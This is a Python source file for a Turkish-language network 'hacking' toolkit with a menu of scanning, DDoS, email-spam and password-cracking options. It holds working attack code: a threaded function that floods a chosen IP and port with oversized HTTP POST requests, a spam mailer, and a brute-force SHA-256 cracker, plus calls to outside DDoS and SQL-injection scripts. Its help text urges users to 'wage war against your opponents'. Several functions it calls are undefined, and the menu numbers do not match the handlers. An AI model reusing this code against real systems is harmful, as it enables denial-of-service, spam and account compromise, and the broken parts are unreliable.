import subprocess, os, tkinter as tk, time, socket, threading
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from smtplib import SMTP, SMTPException
import sys
import time

import mysql
import netifaces, psutil
from geopy.geocoders import Nominatim

from flask import Flask
import logging

from scapy.layers import bluetooth, dns
from scapy.layers.l2 import ARP, Ether
import itertools, hashlib, string
from pywifi import PyWiFi
from concurrent.futures import ThreadPoolExecutor
from pywifi import const
from scapy.layers.inet import IP

from scapy.all import srp, sniff
import platform, sys
from sys import stdout

from scapy.all import IP, TCP, IPv6, send, RandIP6


from random import randint

import subprocess
import sys
import string
import time

from argparse import ArgumentParser

from scapy.modules import nmap

#-----------------------------------------------------------------------------------------------------------------------------------------------------------
def exit_ascii():
    exit_message = r"""
……………W$ХН~Н!Н!НХGFDSSFFFTTSDS.
………..*UHWHН!hhhhН!?M88WHXХWWWWSW$.
…….X*#M@$Н!eeeeНXНM$$$$$$WWxХWWWSW$
……ХН!Н!Н!?HН..ХН$Н$$$$$$$$$$8XХDDFDFWW$
….Н!f$$$$gХhН!jkgfХ~Н$Н#$$$$$$$$$$8XХKKWW$,
….ХНgХ:НHНHHHfg~iU$XН?R$$$$$$$$MMНGG$$R$$
….~НgН!Н!df$$$$$JXW$$$UН!?$$$$$$RMMНLFG$$$$
……НХdfgdfghtХНM”T#$$$$WX??#MRRMMMН$$$$$$
……~?W…fiW*`……..`”#$$$$8НJQ!Н!?WWW?Н!J$$$$
………..M$$$$…….`”T#$T~Н8$8$WUWUXUQ$$$$
………..~#$$$mХ………….~Н~$$$?$$AS$$$$$F$
…………..~T$$$$8xx……xWWFW~##*””””””II$
……………$$$.P$T#$$@SDJW@*/**$$….,,$,
………….$$$L!?$$.XXХXUW…../…..$$,,,,…,,ХJ’
………….$$$H.Нu….””$$B$$MEb!MХUНT$$
…………..?$$$B $ $Wu,,”***PF~***$/
………………..L$$$$B$$eeeХWP$$/
…………………..”##*$$$$M$$F”
    """
    for char in exit_message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.001)
    print("\n\n")
    print(exit_message)

def display_menu():
    menu_ascii = r"""
      
 ▂▃▄▅▆▇█▓▒░ASEQ░▒▓█▇▆▅▄▃▂
       """
    for char in menu_ascii:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.001)
    print("\n\n")


    print("""
                                                                            ;
                                                                 :      ED.               :
 L.                     ,;                    .                 t#,     E#Wi             t#,
 EW:        ,ft       f#i                    ;W .    .         ;##W.    E###G.          ;##W.
 E##;       t#E     .E#t   GEEEEEEEL        f#E Di   Dt       :#L:WE    E#fD#W;        :#L:WE              ;
 E###t      t#E    i#W,    ,;;L#K;;.      .E#f  E#i  E#i     .KG  ,#D   E#t t##L      .KG  ,#D           .DL
 E#fE#f     t#E   L#D.        t#E        iWW;   E#t  E#t     EE    ;#f  E#t  .E#K,    EE    ;#f  f.     :K#L     LWL
 E#t D#G    t#E :K#Wfff;      t#E       L##Lffi E#t  E#t    f#.     t#i E#t    j##f  f#.     t#i EW:   ;W##L   .E#f
 E#t  f#E.  t#E i##WLLLLt     t#E      tLLG##L  E########f. :#G     GK  E#t    :E#K: :#G     GK  E#t  t#KE#L  ,W#;
 E#t   t#K: t#E  .E#L         t#E        ,W#i   E#j..K#j...  ;#L   LW.  E#t   t##L    ;#L   LW.  E#t f#D.L#L t#K:
 E#t    ;#W,t#E    f#E:       t#E       j#E.    E#t  E#t      t#f f#:   E#t .D#W;      t#f f#:   E#jG#f  L#LL#G
 E#t     :K#D#E     ,WW;      t#E     .D#j      E#t  E#t       f#D#;    E#tiW#G.        f#D#;    E###;   L###j
 E#t      .E##E      .D#;     t#E    ,WK,       f#t  f#t        G#t     E#K##i           G#t     E#K:    L#W;
 ..         G#E        tt      fE    EG.         ii   ii         t      E##D.             t      EG      LE.
             fE                 :    ,                                  E#t                      ;       ;@
              ,                                                         L:
──────────────────────────────────────────────
╔══════════════════════════════════════════════╗
║       💻 **NETWORK DISCOVERY & DIAGNOSIS**              
╚══════════════════════════════════════════════╝
────────────────────────────────────────────────
[1] 📶 Scan WiFi Networks       | [2] 🖥️ List Network Interfaces
[3] 🛡️ Port Scan                | [4] 🌐 List Network IPs
[5] 📍 Get Location from IP     | [6] 🌐 Check Network Bandwidth
╔══════════════════════════════════════════════╗
║                  🔒 **SECURITY**                         
╚══════════════════════════════════════════════╝
────────────────────────────────────────────────
[7] 🔍 Vulnerability Scan       | [8] 🌐 List VPN Connections
[9] 📶 Scan Bluetooth Devices
╔══════════════════════════════════════════════╗
║           👀 MONITORING & ANALYSIS  
╚══════════════════════════════════════════════╝
────────────────────────────────────────────────
[10] 👁️‍🗨️ Monitor Network Traffic | [11] 🔍 DNS Lookup
╔══════════════════════════════════════════════╗
║               ⚙️ **OTHER**                               
╚══════════════════════════════════════════════╝
────────────────────────────────────────────────
[12] ⚠️ Start DDoS Attack        | [13] 📧 Send Email Spam
[14] 🔓 Password Cracker         | [15] 📊 Data Analyzer
[66] 🌐 DDOS HACK                | [17] 🔍 SQL Injection Vulnerability Scan
==================================================================
[0] 🚪 Exit                    | [100] ❓ How to Use?
==================================================================
     ▬▬▬▬▬▬▬▬▬๑۩۞۩๑▬▬▬▬▬▬▬▬▬▬▬
                    s3loc
       ▬▬▬▬▬▬▬▬▬๑۩۞۩๑▬▬▬▬▬▬▬▬▬


          

    """)


def nasil():
    learn = r"""
    How to use it? 🌟🔧

This program is designed to perform various network and system management tasks such as network discovery and diagnostics, security, monitoring and analysis. Below are the basic steps of using the program:

    Scan WiFi Networks 🔍✨✨: To scan available WiFi networks. Take a look at the wireless world!
    List Network Interfaces 📡🔢: Lists all network interfaces on the system. Lists available ports for you!
    Perform Port Scan 🚪🔍: Performs a port scan on a specified target. Knock on doors and find hidden entrances!
    List Network IPs 🌐🔢🔢: Lists all network IP addresses on the system. Navigate the network world and see who is there!
    Get Location from IP Address 📍🗺️: Finds the geographical location of a specific IP address. Solve the mystery of IP addresses and discover locations around the world!
    Scan for Vulnerabilities 🛡️🔍: Runs a vulnerability scan on a specified target. Check your firewalls and close vulnerabilities!
    List VPN Connections 🔒📋: Lists active VPN connections on the system. Protect your privacy and check your VPN connections!
    Scan Bluetooth Devices 📶🔍: To scan for nearby Bluetooth devices. Dive into the world of Bluetooth and discover nearby devices!


Make DNS Query 🔍📚: Performs a DNS query for a specified domain name. Browse the internet's address book and find targets!
    Launch DDoS Attack ⚔️🌐: Launches a DDoS attack on a specified target. Get ready for the attack and wage war against your opponents!
    Send Email Spam 📧🔥🔥: To send spam emails to the specified email address. Send spam and confuse heads!
    Password Cracker 🔓🔍: Cracks passwords for a given hash value. Decode secret codes to crack passwords!
    Grouper 📊🔍: Creates an output file by grouping samples by a specific element. Classify and organize data!
    Monitor Network Traffic 📈👁️: Monitors incoming and outgoing traffic data from a specified network interface. Monitor network traffic and keep data flow under control!

Please think carefully before using each option and avoid performing actions that may have unintended consequences. 

Translated with DeepL.com (free version)
     

    """
    print(learn)
#================================================================================================================================================================

#================================================================================================================================================================

def welcome_ascii():
    welcome_message = r"""
    Yb        dP 888888 88      dP""b8  dP"Yb  8b    d8 888888
     Yb  db  dP  88__   88     dP   `" dP   Yb 88b  d88 88__
      YbdPYbdP   88""   88  .o Yb      Yb   dP 88YbdP88 88""
       YP  YP    888888 88ood8  YboodP  YbodP  88 YY 88 888888
    """
    for char in welcome_message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.001)
    print("\n\n")
#================================================================================================================================================================
#----- MENÜ KISMI-------------





#================================================================================================================================================================


#================================================================================================================================================================


wifi = PyWiFi()
iface = wifi.interfaces()[0]

app = Flask(__name__)
#================================================================================================================================================================
#================================================================================================================================================================
#================================================================================================================================================================



#================================================================================================================================================================
#================================================================================================================================================================
#================================================================================================================================================================
def scan_network():
    arp = ARP(pdst="192.168.1.0/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices

def generate_passwords(length, characters):
    for combination in itertools.product(characters, repeat=length):
        yield ''.join(combination)

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def crack_password(password_length, characters, target_hash):
    with ThreadPoolExecutor(max_workers=8) as executor:
        for password in generate_passwords(password_length, characters):
            hashed_password = hash_password(password)
            if hashed_password == target_hash:
                return password
    return None

def log_user_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    try:
        connection = mysql.connector.connect(
            host='localhost',
            user='root',
            password='yousql ',
            database='yousql'
        )
        if connection.is_connected():
            cursor = connection.cursor()
            sql = "INSERT INTO user_ips (ip_address, login_time) VALUES (%s, %s)"
            val = (ip_address, datetime.now())
            cursor.execute(sql, val)
            connection.commit()
            print("Kullanıcı IP başarıyla kaydedildi.")
        else:
            print("MySQL veritabanına bağlanırken bir hata oluştu.")
    except mysql.connector.Error as error:
        print("MySQL bağlantı hatası:", error)
    finally:
        if 'connection' in locals() and connection.is_connected():
            connection.close()
            print("MySQL bağlantısı kapatıldı.")

def email_spam():
    print("[Email Spam] Email Spam selected!")
    sender_email = input("[Email Spam] Sender E-mail address: ")
    sender_password = input("[Email Spam] Sender Email password: ")
    recipient_email = input("[Email Spam] Recipient Email address: ")
    subject = input("[Email Spam] Subject: ")
    text = input("[Email Spam] Text: ")
    try:
        with SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            message = MIMEMultipart()
            message['From'] = sender_email
            message['To'] = recipient_email
            message['Subject'] = subject
            message.attach(MIMEText(text, 'plain'))
            server.sendmail(sender_email, recipient_email, message.as_string())
        print("[Email Spam] Email successfully sent!")
    except SMTPException as ex:
        print(f"[Email Spam] Error sending email: {ex}")

def ddos():
    print("[DDoS] DDoS selected!")
    target = input("[DDoS] IP Address: ")
    port = int(input("[DDoS] Port: "))
    threads = int(input("[DDoS] Thread: "))
    threshold = 1000

    def attack():
        while True:
            try:
                start_time = time.time()
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
                    client.connect((target, port))
                    client.send("POST / HTTP/1.1\r\nhost: {}\r\nContent-length: 999999\r\n\r\n".format(target).encode())
                elapsed_time = (time.time() - start_time) * 1000
                if elapsed_time >= threshold:
                    print(f"[{datetime.now()}] Thread: {threading.current_thread().name} Ping: {elapsed_time} ms")
            except Exception as ex:
                print(f"Error: {ex}")

    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def arp_scan(ip_range):
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    devices = []
    for element in answered_list:
        devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
    return devices


def packet_callback(packet):
    if IP in packet:
        src_ip = packet[IP].src
        print("Gelen IP adresi:", src_ip)

def sniff_incoming_traffic():
    print("Ağ trafiği dinleniyor...")
    sniff(filter="ip", prn=packet_callback, store=0)


def ping(host):

    param = '-n' if platform.system().lower() == 'windows' else '-c'

   
    command = ['ping', param, '1', host]
    return subprocess.call(command) == 0

def scan_wifi_networks():
    iface.scan()
    time.sleep(5)
    return iface.scan_results()

def display_wifi_networks(networks):
    print("\nWiFi Ağları:")
    print("--------------")
    for network in networks:
        security = "Güvenli" if network.akm != const.AKM_TYPE_NONE else "Güvensiz"
        print(f"SSID: {network.ssid}, Sinyal Gücü: {network.signal}, Güvenlik: {security}")

def check_wifi_security():
    networks = scan_wifi_networks()
    display_wifi_networks(networks)
    input("Devam etmek için Enter'a basın...")

def list_network_interfaces():
    print("Ağ Arabirimleri:")
    print("-----------------")
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        print(f"Ağ Arabirimi: {interface}")
        addresses = netifaces.ifaddresses(interface)
        for address_family, info in addresses.items():
            if address_family == netifaces.AF_INET:
                for address_info in info:
                    ip_address = address_info.get('addr')
                    netmask = address_info.get('netmask')
                    print(f"IPv4 Adresi: {ip_address}")
                    print(f"Alt Ağ Maskesi: {netmask}")


def scan_ports(target, start_port, end_port):
    print(f"Port taraması başlatılıyor: {target}")
    for port in range(start_port, end_port + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"Port {port}: AÇIK")


def list_network_ips():
    interfaces = netifaces.interfaces()

    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface)
        for address_family, info in addresses.items():
            if address_family == netifaces.AF_INET:
                print(f"Ağ Arabirimi: {interface}")
                for address_info in info:
                    ip_address = address_info.get('addr')
                    netmask = address_info.get('netmask')
                    print(f"IPv4 Adresi: {ip_address}, Alt Ağ Maskesi: {netmask}")


def get_location_from_ip(ip_address):
    geolocator = Nominatim(user_agent="geoapiExercises")
    location = geolocator.geocode(ip_address)
    return location


def display_location(location):
    if location:
        print(f"Konum: {location.address}")
        print(f"Enlem: {location.latitude}, Boylam: {location.longitude}")
    else:
        print("Konum bulunamadı.")


def scan_vulnerabilities(target):
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-sV --script=vuln')
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"Port {port}: {nm[host][proto][port]}")


def list_vpn_connections():
    print("Aktif VPN bağlantıları:")
    print("VPN Adı: ExampleVPN, IP Adresi: 192.168.1.1")


def scan_bluetooth_devices():
    print("Bluetooth cihazları taranıyor...")
    try:
        nearby_devices = bluetooth.discover_devices(lookup_names=True)
        print("Bulunan Bluetooth cihazları:")
        for addr, name in nearby_devices:
            print(f"Cihaz Adı: {name}, MAC Adresi: {addr}")
    except Exception as e:
        print(f"Bluetooth cihazlarını tararken hata oluştu: {e}")


def monitor_network():
    net_io = psutil.net_io_counters(pernic=True)
    for interface, counters in net_io.items():
        print(f"{interface} - Bytes Sent: {counters.bytes_sent}, Bytes Received: {counters.bytes_recv}")


def dns_lookup(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ipval in result:
            print(f"{domain} IP Adresi: {ipval.to_text()}")
    except Exception as e:
        print(f"{domain} için DNS araması yapılırken hata oluştu: {e}")
#-------------------------------------------
def get_user_input_criteria():
    """
    Kullanıcıdan demirbaşları nasıl gruplandırmak istediklerini belirtmelerini isteyen fonksiyon.
    """
    while True:
        criteria_input = input("Kriterleri Almak: Demirbaşları nasıl gruplandırmak istersiniz? (Örneğin: DB=PC, DC=YAZICI)\n")
        criteria = {}
        for item in criteria_input.split(','):
            try:
                key, value = item.split('=')
                criteria[key.strip()] = value.strip()
            except ValueError:
                print("Geçersiz giriş. Lütfen formatı kontrol edin.")
                continue
        return criteria

def get_asset_data():
    """
    Kullanıcıdan her bir demirbaşın verilerini girmelerini isteyen fonksiyon.
    """
    asset_data = {}
    print("\nDemirbaş Verilerini Almak: Her bir demirbaşın verilerini girin. Örneğin, 'PC: 0DBY83#'\n")
    while True:
        asset_info = input("Demirbaş bilgisini girin (Çıkmak için 'q' tuşuna basın):\n")
        if asset_info.lower() == 'q':
            break
        try:
            asset_type, asset_data_str = asset_info.split(':')
            asset_id = asset_data_str.strip().split('#')[0]
            if asset_type.strip() not in asset_data:
                asset_data[asset_type.strip()] = []
            asset_data[asset_type.strip()].append(asset_id)
        except ValueError:
            print("Geçersiz giriş. Lütfen formatı kontrol edin.")
            continue
    return asset_data

def get_grouping_criteria(criteria):
    """
    Her bir demirbaş türü için kullanıcının bir gruplandırma kriteri belirlemesini isteyen fonksiyon.
    """
    grouping_criteria = {}
    print("\nGruplandırma Kriterlerini Belirlemek: Her bir demirbaş türü için bir gruplandırma kriteri belirleyin.")
    for asset_type, criterion in criteria.items():
        group_criterion = input(f"{asset_type} demirbaşlarını hangi kritere göre gruplamak istersiniz?\n")
        grouping_criteria[asset_type] = group_criterion.strip()
    return grouping_criteria

def group_assets(asset_data, grouping_criteria):
    """
    Kullanıcının belirlediği kriterlere göre demirbaşları gruplayan fonksiyon.
    """
    grouped_assets = {}
    for asset_type, assets in asset_data.items():
        criterion = grouping_criteria.get(asset_type)
        if criterion:
            grouped_assets[asset_type] = {}
            for asset in assets:
                asset_info = input(f"{asset_type} {asset} için {criterion} bilgisini girin:\n")
                if asset_info.strip() not in grouped_assets[asset_type]:
                    grouped_assets[asset_type][asset_info.strip()] = []
                grouped_assets[asset_type][asset_info.strip()].append(asset)
    return grouped_assets

def display_groups(grouped_assets):
    """
    Grupları gösteren fonksiyon.
    """
    print("\nGrupları Göstermek:")
    for asset_type, groups in grouped_assets.items():
        print(f"\n{asset_type.upper()} DEMİRBAŞLARI:")
        for criterion, assets in groups.items():
            print(f"{criterion}: {', '.join(assets)}")

def continue_option():
    """
    Kullanıcıya devam etme seçeneği sunan fonksiyon.
    """
    return input("\nDevam Etme Seçeneği Sunmak: Başka bir işlem yapmak ister misiniz? (E/H)\n").upper() == 'E'
#---------------------------------------------------------
def loading_animation2():
    animation = "|/-\\"
    for i in range(20):
        time.sleep(0.1)
        sys.stdout.write("\r" + "Loading " + animation[i % len(animation)])
        sys.stdout.flush()
def main():
    welcome_ascii()
    while True:
        display_menu()
        choice = input("Please select an option: ")

        if choice == '1':
            loading_animation()
            print("\nChecking Wi-Fi security...")
            check_wifi_security()
            print("Operation completed.")
        elif choice == '2':
            loading_animation()
            print("\nListing network interfaces...")
            list_network_interfaces()
            print("Operation completed.")
        elif choice == '3':
            loading_animation()
            target = input("\nTarget IP address: ")
            start_port = int(input("Start port: "))
            end_port = int(input("End port: "))
            print(f"Scanning ports on {target}...")
            scan_ports(target, start_port, end_port)
            print("Operation completed.")
        elif choice == '4':
            loading_animation()
            print("\nListing network IP addresses...")
            list_network_ips()
            print("Operation completed.")
        elif choice == '5':
            loading_animation()
            ip_address = input("\nIP address: ")
            print(f"Fetching location for {ip_address}...")
            location = get_location_from_ip(ip_address)
            display_location(location)
            print("Operation completed.")
        elif choice == '6':
            loading_animation()
            target = input("\nTarget IP address: ")
            print(f"Scanning vulnerabilities on {target}...")
            scan_vulnerabilities(target)
            print("Operation completed.")
        elif choice == '7':
            loading_animation()
            print("\nListing VPN connections...")
            list_vpn_connections()
            print("Operation completed.")
        elif choice == '8':
            loading_animation()
            print("\nScanning Bluetooth devices...")
            scan_bluetooth_devices()
            print("Operation completed.")
        elif choice == '9':
            loading_animation()
            print("\nMonitoring network...")
            monitor_network()
            print("Operation completed.")
        elif choice == '10':
            loading_animation()
            domain = input("\nDomain name: ")
            print(f"Performing DNS lookup for {domain}...")
            dns_lookup(domain)
            print("Operation completed.")
        elif choice == '11':
            loading_animation()
            print("\nStarting DDoS attack...")
            ddos()
            print("Operation completed.")
        elif choice == '12':
            loading_animation()
            print("\nSending email spam...")
            email_spam()
            print("Operation completed.")
        elif choice == '13':
            loading_animation()
            target_hash = input("\nTarget hash: ")
            password_length = int(input("Password length: "))
            character_set = input("Character set to use (default: ascii_letters+digits): ")
            if not character_set:
                character_set = string.ascii_letters + string.digits

            print("Cracking password...")
            cracked_password = crack_password(password_length, character_set, target_hash)
            if cracked_password:
                print(f"Password cracked: {cracked_password}")
            else:
                print("Password couldn't be cracked.")
            print("Operation completed.")
        elif choice == '14':
            print("This option is not active.")
        elif choice == '15':
            loading_animation()
            print("\nSniffing incoming traffic...")
            sniff_incoming_traffic()
            print("Operation completed.")
        elif choice == '16':
            loading_animation()
            host = input("\nEnter IP address to ping: ")
            print(f"Pinging {host}...")
            ping(host)
            print("Operation completed.")
        elif choice == '17':
            loading_animation()
            print("\nRunning Velettt...")
            subprocess.run(['python', 'velettt.py'])
            print("Operation completed.")
        elif choice == '100':
            how()
        elif choice == '66':
            loading_animation()
            print("\nStarting DDoS attack...")
            subprocess.Popen(['python', r'DDOS.PY ']) #Write the extension of the ddos ​​file
            print("Operation completed.")
        elif choice == '0':
            exit_ascii()
            exit()
        else:
            print("Invalid option. Please try again.")

        input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()
